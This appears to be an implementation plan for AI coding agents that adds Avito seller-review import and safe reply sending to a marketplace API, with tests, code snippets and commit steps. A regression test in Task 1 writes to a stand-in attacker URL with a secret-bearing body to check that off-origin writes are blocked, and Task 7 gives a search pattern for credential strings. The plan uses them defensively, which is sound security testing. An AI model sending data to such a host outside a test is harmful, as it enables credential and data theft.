# Avito Actionable Reviews Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Import only currently answerable Avito seller reviews and send safe, reconcilable text answers through Respio's existing account, sync, and reply pipelines while retaining the Messenger integration.

**Architecture:** A focused ratings adapter shares Avito's fixed-origin HTTP client and token resolver with the Messenger adapter. The capability registry resolves credentials, reviews, and chats independently; the existing scheduler and reply executor retain their leases, tenant checks, and idempotency boundaries. Avito reviews alone may have no product or review text.

**Tech Stack:** Python 3.13, FastAPI, httpx, SQLAlchemy/PostgreSQL, pytest, Ruff, strict Pyright; existing Next.js admin for accurate capability display.

**Spec:** `docs/superpowers/specs/2026-09-24-avito-reviews-design.md`

## Global Constraints

- Use the four user-supplied OpenAPI exports only as contract data; their freshness and provenance are not independently verified.
- Never make a live Avito or other marketplace request without separate authorization or use real credentials in tests or logs.
- No fabricated item, text, answer status, permission, customer, or publication claim. No silent fallback or blind write retry.
- Keep `.handoff/` and `apps/cms/` untouched; do not change branch, merge, push, deploy, release, or bump versions.
- Preserve tenant isolation, fixed provider origin, secret redaction, database leases, and the existing reply state machine.
- Admin copy may describe document-backed functionality but not production-verified sending. Public Avito readiness copy remains runtime-unverified.
- The owner chose to import only reviews with `canAnswer: true` and no existing answer; listings management and historical review display are outside this plan.

## Review Focus

- Partial API access: valid ratings access with Messenger denied must enable reviews but never create a chat sync state (Task 5 test).
- Page drift and provider count mismatch: a short/empty page before `total` is reached must fail visibly, not report complete (Task 3 test).
- Null item and empty review text: import without invented product/text and keep other providers' stricter validation (Task 3 test).
- Stale eligibility: an answer added after import, or `canAnswer` becoming false, must reconcile an untouched inbox record and prevent duplicate submission (Tasks 3 and 4 tests).
- Ambiguous write and secret-bearing provider error: never retry POST blindly or include request/response body and credentials in safe errors (Task 4 and Task 7 tests).

---

### Task 1: Extract shared authenticated Avito transport

**Files:**
- Create: `apps/api/app/adapters/avito_http.py`
- Modify: `apps/api/app/adapters/avito.py`
- Test: `apps/api/app/tests/test_avito_adapter_contract.py`, `apps/api/app/tests/test_avito_reply_safety.py`

**Interfaces:**
- Consumes: `AvitoCredentialResolver.resolve()`/`invalidate()`, `request_read_with_retry()`, `ReadRetryPolicy`.
- Produces: `AvitoApiClient(client, credential_resolver, read_retry_policy)`, `read(raw_credential, path, *, params) -> AdapterResult[object]`, `write(raw_credential, path, *, body) -> AdapterResult[object]`.

- [ ] **Step 1: Add a failing write-origin regression and preserve existing behavior assertions.** In `test_avito_reply_safety.py`, call the existing low-level `_write` boundary with an absolute hostile URL and assert zero requests before credential resolution; it currently attempts that URL, so this is RED. Retain the public 401-read-refresh and one-shot-write tests while migrating the transport.

```python
result = await adapter._write(CREDENTIAL, "https://attacker.invalid/collect", body={"message": "secret"})
assert result.ok is False
assert transport.requests == []
```

- [ ] **Step 2: Run the new test and confirm RED** on the missing write-path guard, not a fixture/import error: `..\..\.venv\Scripts\python.exe -m pytest app/tests/test_avito_reply_safety.py::test_avito_write_rejects_absolute_path_before_authentication -q` from `apps/api`.
- [ ] **Step 3: Move the current authenticated `_read`, `_write`, response parsing, and safe status mapping from `AvitoAdapter` into `AvitoApiClient`; delegate existing chat calls and remove the old copies atomically.** Retarget the new origin regression from the removed private method to `AvitoApiClient.write()` in the same patch. Keep read-only 401 refresh and bounded transient retry; never refresh/retry a write. Reject non-relative provider paths via `ensure_relative_provider_path` before credential resolution or transport.

```python
self._api = AvitoApiClient(client, credential_resolver or AvitoCredentialResolver(client), read_retry_policy)
response = await self._api.read(credential, "/messenger/v2/accounts/123/chats", params={"limit": 1})
```

- [ ] **Step 4: Verify GREEN** with all Avito tests, Ruff, and strict Pyright; inspect the diff for duplicate HTTP/error code and secret-bearing logs.
- [ ] **Step 5: Commit only this slice** with `git add -- apps/api/app/adapters/avito_http.py apps/api/app/adapters/avito.py apps/api/app/tests/test_avito_adapter_contract.py apps/api/app/tests/test_avito_reply_safety.py` and `git commit -m "refactor(avito): share authenticated provider transport"`.

### Task 2: Route each supported review stream without a compatibility seam

**Files:**
- Modify: `apps/api/app/adapters/registry.py`, `apps/api/app/services/sync_service.py`, `apps/api/app/services/scheduled_sync_service.py`, `apps/api/app/services/reply_execution_service.py`
- Test: `apps/api/app/tests/test_adapter_registry_boundaries.py`, `apps/api/app/tests/test_marketplace_sync_pagination.py`, `apps/api/app/tests/test_wildberries_reply_execution_safety.py`

**Interfaces:**
- Consumes: existing `MarketplaceStream`, `CredentialAdapter`, `ReviewQuestionAdapter`, `ConversationAdapter`.
- Produces: `ProviderRegistration(capability, credential_factory, review_factory, conversation_factory)` and `MarketplaceAdapterRegistry.review_questions(marketplace, stream)`; the old single `factory` field and stream-agnostic lookup are removed in the same change.

- [ ] **Step 1: Write registry tests** proving `REVIEWS` lookup succeeds only when that stream is declared, `QUESTIONS` is rejected before constructing an adapter for a review-only registration, and existing WB/Ozon/Yandex review+question registrations still resolve. Update existing service doubles to accept `stream` explicitly.

```python
assert registry.review_questions(Marketplace.WILDBERRIES, MarketplaceStream.REVIEWS).marketplace is Marketplace.WILDBERRIES
with pytest.raises(UnsupportedCapabilityError):
    registry.review_questions(Marketplace.AVITO, MarketplaceStream.QUESTIONS)
```

- [ ] **Step 2: Run the named registry and service tests to observe RED** because the old lookup does not accept `stream`.
- [ ] **Step 3: Replace registration and lookup in one patch.** Resolve and cache instances by `(marketplace, role)`, require the exact stream before invoking its factory, and pass `MarketplaceStream.REVIEWS` or `QUESTIONS` from sync/reply callers. Keep Avito's declared capability chat-only until Task 5 wires the complete ratings adapter; no falsely advertised intermediate capability.

```python
def review_questions(self, marketplace: Marketplace, stream: MarketplaceStream) -> ReviewQuestionAdapter:
    if stream not in {MarketplaceStream.REVIEWS, MarketplaceStream.QUESTIONS}:
        raise UnsupportedCapabilityError(marketplace, frozenset({stream}))
    self._require_streams(marketplace, frozenset({stream}))
    return self._resolve_role(marketplace, "reviews", ReviewQuestionAdapter)
```

In `MarketplaceSyncService.request_sync()`:

```python
for stream in capability.streams & {MarketplaceStream.REVIEWS, MarketplaceStream.QUESTIONS}:
    registry.review_questions(marketplace, stream)
```

- [ ] **Step 4: Verify GREEN** with the registry tests, sync/reply contract suites, Ruff, and Pyright; search for every old `review_questions(marketplace)` consumer and `ProviderRegistration` single-factory construction, leaving none.
- [ ] **Step 5: Commit** the registry and all migrated consumers/tests as `refactor(api): route marketplace review streams explicitly`.

### Task 3: Read and normalize actionable Avito reviews

**Files:**
- Create: `apps/api/app/adapters/avito_reviews.py`, `apps/api/app/tests/test_avito_review_adapter_contract.py`, `apps/api/app/tests/test_avito_review_ingest.py`
- Modify: `apps/api/app/adapters/base.py`, `apps/api/app/services/marketplace_ingest_service.py`, `apps/api/app/automation/state_machine.py`
- Test: `apps/api/app/tests/test_marketplace_ingest_concurrency.py`

**Interfaces:**
- Consumes: `AvitoApiClient.read()`, `MarketplaceStream.REVIEWS`, `NormalizedMessage`, `NormalizedProduct`, `MarketplacePage`.
- Produces: `AvitoReviewAdapter.validate_credentials(credential, seller_id) -> AdapterResult[CredentialValidation]`, `.fetch_page(credential, seller_id, stream, cursor) -> AdapterResult[MarketplacePage[NormalizedMessage]]`, and `_fetch_reviews(credential, cursor) -> AdapterResult[MarketplacePage[AvitoReviewRecord]]` shared with Task 4 preflight. `AvitoReviewRecord` is a frozen internal value object with `review_id`, `score`, `created_unix`, `stage`, `text`, `can_answer`, `used_in_score`, `answer`, `sender_name`, `product`, and `photos`; `answer` is a frozen `AvitoAnswerRecord(answer_id, text, status, created_unix) | None`. `MarketplacePage.resolutions` is an optional tuple of `ProviderMessageResolution(external_id, message_type, status)` for provider-observed state changes to already imported records. The adapter is not registered as a full `ReviewQuestionAdapter` until Task 4 adds its reply methods.

- [ ] **Step 1: Write failing synthetic GET and ingestion tests** for the ratings read-only credential probe, `limit=50`, canonical offset progression against `total`, only `canAnswer=true`/`answer=null` insertion, null or absent item, a real item ID/title, sender name, one valid HTTPS URL per image, score 1–5, empty text, malformed required fields, and an empty page before `total`. Use a fixture of 50 raw reviews (one actionable, 49 already answered) with `total=51`: the next cursor must count 50 raw records, not one imported record. Seed an existing `needs_reply` Avito review, then ingest a page where it now has a published answer and assert `answered`; a `canAnswer=false` record with no answer becomes `blocked_by_marketplace`. An already queued/sending reply must not be overwritten; a nonactionable review never previously imported must not be inserted. Repeat with another tenant's matching external ID and assert it is untouched.

```python
assert dict(transport.requests[1].url.params) == {"offset": "0", "limit": "50"}
assert [item.external_id for item in page.items] == ["92312343"]
assert page.items[0].product is None
assert page.items[0].customer_text == ""
assert page.next_cursor == "50"
assert existing.status == MessageStatus.ANSWERED.value
assert other_tenant_message.status == MessageStatus.NEEDS_REPLY.value
```

- [ ] **Step 2: Run the named tests and confirm RED** for missing ratings adapter/nullable Avito review ingestion.
- [ ] **Step 3: Implement a strict 50-record reader and same-transaction reconciliation.** Parse positive numeric review IDs and `createdAt`, `score`, `stage`, `usedInScore`, `canAnswer`, `text`, and optional answer/sender/item/images; reject malformed shapes and non-HTTPS images. Use decimal offset cursors from `0` through `5000`; fail if a nonterminal page is empty or exceeds the safe ceiling. Filter after validation, without synthesizing product or text. Emit resolutions for observed nonactionable records; in `MarketplaceIngestService.ingest_page`, update only an existing Avito review in the same organization/account with `status=needs_reply` and no reply row, never an in-flight/local reply or another tenant. Map published/moderation/rejected answers to `answered`/`waiting_review`/`needs_manual_check`; map `canAnswer=false` without answer to `blocked_by_marketplace`. Allow the `needs_reply -> blocked_by_marketplace` state transition. Permit `product=None` and empty `customer_text` only for `(Marketplace.AVITO, MessageType.REVIEW)`.

```python
if normalized.product is None and not (marketplace is Marketplace.AVITO and normalized.message_type is MessageType.REVIEW):
    raise InvalidNormalizedRecord("review and question records require a product identity")
if not normalized.customer_text and not (marketplace is Marketplace.AVITO and normalized.message_type is MessageType.REVIEW):
    raise InvalidNormalizedRecord("customer text is invalid")
if resolution.status not in {MessageStatus.ANSWERED, MessageStatus.WAITING_REVIEW, MessageStatus.NEEDS_MANUAL_CHECK, MessageStatus.BLOCKED_BY_MARKETPLACE}:
    raise InvalidNormalizedRecord("provider resolution status is invalid")
```

- [ ] **Step 4: Verify GREEN** for new adapter/ingest tests and existing WB/Ozon/Yandex normalization tests; run Ruff/Pyright and check that account-scoped external-ID uniqueness still deduplicates repeated offset pages.
- [ ] **Step 5: Commit** this read/ingestion slice as `feat(avito): import answerable seller reviews`.

### Task 4: Reconcile and send Avito review answers safely

**Files:**
- Modify: `apps/api/app/adapters/avito_reviews.py`, `apps/api/app/services/reply_execution_service.py`
- Create: `apps/api/app/tests/test_avito_review_reply_safety.py`
- Test: `apps/api/app/tests/test_reply_dispatch_recovery.py`, `apps/api/app/tests/test_manual_reply_safety.py`

**Interfaces:**
- Consumes: `ProviderMessageContext`, `ExistingReplyResult`, `ProviderWriteReceipt`, the Task 3 raw reviews reader, shared reply state machine.
- Produces: `AvitoReviewAdapter.find_existing_reply()` and `.send_reply()` for `MessageType.REVIEW` only; `moderation`/`rejected` are non-publishable provider states; a valid send receipt carries the internal `accepted_unverified` state, which is persisted as `message.metadata_json["provider_publication"] = "unverified"` without claiming provider publication.

- [ ] **Step 1: Write failing tests** for an unanswered review, newly added answer, `canAnswer=false`, review missing before send, moderation/rejected answer, 200 receipt with positive `id`/`createdAt`, malformed 200, 401/403/429/5xx, timeout, and exact one-shot POST body. Assert no secret/customer text in safe errors and no second POST after an ambiguous first attempt. A successful send must mark the local submission as publication-unverified; a provider-confirmed published preflight must not.

```python
assert sent_request.read() == b'{"reviewId":92312343,"message":"Synthetic reply"}'
assert receipt.provider_reply_id == "1234567"
assert len([request for request in transport.requests if request.url.path == "/ratings/v1/answers"]) == 1
assert message.metadata_json["provider_publication"] == "unverified"
```

- [ ] **Step 2: Run the named tests and confirm RED** for missing review preflight/send and provider-state handling.
- [ ] **Step 3: Complete `AvitoReviewAdapter` as a `ReviewQuestionAdapter` and scan bounded GET pages for the target ID before sending.** Existing answer returns ID/status; missing/unanswerable/invalid state returns a safe error. Validate nonblank, trimmed answer text within 3000 characters before token acquisition; issue one JSON POST to the fixed path, parse receipt ID/time, and never infer publication status from `createdAt`. Add `moderation` and `rejected` to the existing non-publishable-state branch. Carry `accepted_unverified` on a successful receipt into `_mark_sent` and persist only a bounded internal metadata flag on the Avito review message; keep other marketplaces' sent semantics unchanged. A `QUESTIONS` call returns `unsupported_capability`; the registry never routes that stream to Avito.

```python
body = {"reviewId": int(context.external_id), "message": text}
response = await self._api.write(credential, "/ratings/v1/answers", body=body)
return AdapterResult(ok=True, data=ProviderWriteReceipt(provider_reply_id=str(answer_id), provider_state="accepted_unverified"))
```

- [ ] **Step 4: Verify GREEN** for Avito review safety and shared reply recovery suites; inspect the retry state machine for ambiguous writes and confirm no provider body enters audit or errors.
- [ ] **Step 5: Commit** the review answer slice as `feat(avito): reconcile and send seller review answers`.

### Task 5: Validate chat and ratings access independently, then enable review sync

**Files:**
- Create: `apps/api/app/adapters/avito_account.py`, `apps/api/app/tests/test_avito_review_account_contract.py`
- Modify: `apps/api/app/adapters/base.py`, `apps/api/app/adapters/capabilities.py`, `apps/api/app/adapters/registry.py`, `apps/api/app/services/marketplace_account_service.py`
- Test: `apps/api/app/tests/test_avito_account_contract.py`, `apps/api/app/tests/test_marketplace_security_contract.py`, `apps/api/app/tests/test_marketplace_sync_pagination.py`

**Interfaces:**
- Consumes: `AvitoAdapter.validate_credentials()`, `AvitoReviewAdapter.validate_credentials()`, the single shared `AvitoCredentialResolver`.
- Produces: `AvitoCredentialAdapter.validate_credentials(credential, seller_id) -> AdapterResult[CredentialValidation]`; `AVITO_CAPABILITY` with `CHATS` and `REVIEWS`, reply types `CHAT` and `REVIEW`; `CredentialValidation.write_verification: Literal["not_probed"] | None = None` stored in `scopes_json` only when present.

- [ ] **Step 1: Write failing account/registry tests** for chat-only, reviews-only, both-readable, neither-readable, invalid credential before any chat/review probe, and no POST answer during validation. Assert `write_verification=not_probed` and that a reviews-only account creates only a review sync stream.

```python
assert validation.scopes == ("reviews:read", "reviews:write")
assert account.scopes_json["write_verification"] == "not_probed"
assert all(request.url.path != "/ratings/v1/answers" for request in transport.requests)
```

- [ ] **Step 2: Run the named tests and confirm RED** on absent aggregation/capability, not unrelated fixture errors.
- [ ] **Step 3: Add a credential coordinator that resolves the token once and then probes chat and ratings reads independently.** Return only successful stream scopes and a safe failure when neither read is available. Register credential/chat/review factories with one shared Avito resolver. Record `write_verification=not_probed` without calling write endpoints; keep `checked_at` and authorization/audit revalidation behavior intact.

```python
AVITO_CAPABILITY = MarketplaceCapability(
    marketplace=Marketplace.AVITO,
    streams=frozenset({MarketplaceStream.CHATS, MarketplaceStream.REVIEWS}),
    reply_types=frozenset({MessageType.CHAT, MessageType.REVIEW}),
)
```

- [ ] **Step 4: Verify GREEN** for credential/account, registry, scheduler, tenant, and rotation/revocation tests; Ruff/Pyright; inspect `scopes_json` for no raw credentials or tokens.
- [ ] **Step 5: Commit** this capability/validation slice as `feat(avito): validate ratings and chat access independently`.

### Task 6: Admin truth and contract evidence

**Files:**
- Modify: `apps/web/app/app/integrations/[marketplace]/page.tsx`, `apps/web/components/integrations/MarketplaceIntegrationWorkspace.tsx`, `apps/web/components/inbox/InboxWorkspace.tsx`, `docs/integrations/marketplace-contract-evidence.md`
- Create: `apps/web/tests/unit/inbox-workspace.test.tsx`
- Test: `apps/web/tests/unit/integrations-workspace.test.tsx`, `apps/web/e2e/integrations.spec.ts`

**Interfaces:**
- Consumes: account `scopes_json` with actual read streams and `write_verification=not_probed`; Avito review message metadata with `provider_publication=unverified` after an accepted answer.
- Produces: admin wording that names Avito chats and answerable reviews while identifying unverified write access and unverified publication; public Avito page remains unchanged.

- [ ] **Step 1: Read `PRODUCT.md`, `DESIGN.md`, `docs/design/ui-ux-quality-standard.md`, and existing tokens/components in the mandated order before changing UI/copy.** Add failing unit tests that render a reviews-only Avito account and an Avito review with an accepted-but-unverified answer. Check the displayed capability, unverified-write wording, and publication note; do not assert on a mock-only element.

```tsx
expect(screen.getByText(/отзывы/i)).toBeInTheDocument();
expect(screen.getByText(/отправка не проверена/i)).toBeInTheDocument();
expect(screen.getByText(/публикация не подтверждена/i)).toBeInTheDocument();
```

- [ ] **Step 2: Run the named unit test to confirm RED.**
- [ ] **Step 3: Update only the admin integration description/status for actual scopes and the Avito review inbox note.** Avoid changing the public page's readiness claim. Replace the evidence log's “reviews unimplemented” statement with the exact implemented contract, supplied-export hashes, and explicit runtime-unverified limit.

```tsx
avito: { marketplace: "avito", name: "Авито", description: "Чаты и доступные для ответа отзывы" },
```

- [ ] **Step 4: Verify GREEN** with unit tests, `npm run typecheck`, `npm run lint`, `npm run build` from `apps/web`, plus browser QA (`npm run test:e2e`, `npm run test:a11y`, `npm run test:visual`, `npm run lighthouse`) where the environment supports them. Report each blocked gate separately; do not regenerate snapshots merely to silence a failure.
- [ ] **Step 5: Commit** only the admin/evidence changes as `feat(web): describe Avito review capability accurately`.

### Task 7: Final cross-boundary verification on the final tree

**Files:**
- Test: `apps/api/app/tests/test_marketplace_security_contract.py`, `apps/api/app/tests/test_marketplace_ingest_concurrency.py`, `apps/api/app/tests/test_reply_dispatch_recovery.py`, `apps/api/app/tests/test_avito_review_adapter_contract.py`, `apps/api/app/tests/test_avito_review_reply_safety.py`
- Inspect: `apps/api/alembic/versions/`, `apps/api/app/adapters/`, `apps/api/app/services/`, `docs/integrations/marketplace-contract-evidence.md`

**Interfaces:**
- Consumes: all previous tasks' final code and tests.
- Produces: an evidence-backed readiness report; no deployment or production certification.

- [ ] **Step 1: Add any missing behavior regressions for tenant/IDOR, hostile credential JSON, fixed-origin SSRF/path protection, secret-free errors/audit, malformed pagination, SQL parameterization, and duplicate/ambiguous writes.** Each new test must be observed RED before its minimal fix.

```python
assert all(request.url.host == "api.avito.ru" for request in transport.requests)
assert "synthetic-secret" not in repr(result)
assert "synthetic-access-token" not in repr(result)
```

- [ ] **Step 2: Run the final backend gate** from `apps/api`: `..\..\.venv\Scripts\python.exe -m pytest -q`; `..\..\.venv\Scripts\ruff.exe check app`; `..\..\.venv\Scripts\ruff.exe format --check app`; `npx --offline --yes pyright@1.1.411 --project pyproject.toml`. Record exact counts and exit codes.
- [ ] **Step 3: Inspect migrations, SQL, URLs, and logs.** Run `apps/api/.venv/Scripts/alembic.exe -c apps/api/alembic.ini heads` from the repository root if that executable exists, inspect `rg -n 'text\(|exec_driver_sql|execute\(|httpx\.|request\(|Authorization|client_secret|access_token' apps/api/app/adapters apps/api/app/services -g '*.py'`, and review every hit in the changed path for SQL parameterization, fixed origins, and redacted errors. Apply `upgrade`/`downgrade`/`upgrade` only on an isolated or backed-up database; do not claim migration application if no suitable database exists.
- [ ] **Step 4: Run final frontend/browser gates** from Task 6 and `git diff --check`; inspect `git status` to confirm `.handoff/` and `apps/cms/` were not touched and no unrelated files entered commits.
- [ ] **Step 5: Report `contract-complete / runtime-unverified` unless a separately authorized live Avito probe supplies current evidence.** List any failed or unrun gate explicitly; no merge, push, deploy, release, or version bump.
